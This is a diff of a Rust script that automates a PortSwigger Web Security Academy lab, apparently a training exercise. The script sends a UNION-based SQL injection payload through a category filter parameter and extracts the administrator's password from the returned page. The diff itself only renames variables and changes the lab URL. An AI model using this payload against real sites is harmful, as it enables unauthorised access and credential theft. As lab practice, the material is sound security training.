@@ -16,8 +16,8 @@
 ****************************************************************************************/
 #![allow(unused)]
 /***********
- * Imports
- ***********/
+* Imports
+***********/
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
@@ -37,7 +37,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a42004a036aeffc81c289c2001f006c.web-security-academy.net";
+    let url = "https://0a1000670479df6986a37f0d0093000b.web-security-academy.net";
     // build the client used in all subsequent requests
     let client = build_client();
 
@@ -52,18 +52,18 @@ fn main() {
     );
     io::stdout().flush();
     // payload to retreive the name of users table
-    let users_table_payload =
+    let admin_password_payload =
         "' union SELECT username, password from users where username = 'administrator'-- -";
     // fetch the page with the injected payload
-    let users_table_injection = client
-        .get(format!("{url}/filter?category={users_table_payload}"))
+    let admin_password_injection = client
+        .get(format!("{url}/filter?category={admin_password_payload}"))
         .send()
         .expect(&format!(
             "{}",
             "[!] Failed to fetch the page with the injected payload to retreive administrator password from users table"
                 .red()
         ));
-    let mut body = users_table_injection.text().unwrap();
+    let mut body = admin_password_injection.text().unwrap();
     // extract the name of users table
     let admin_password = capture_pattern("<td>(.*)</td>", &body).expect(&format!(
         "{}",
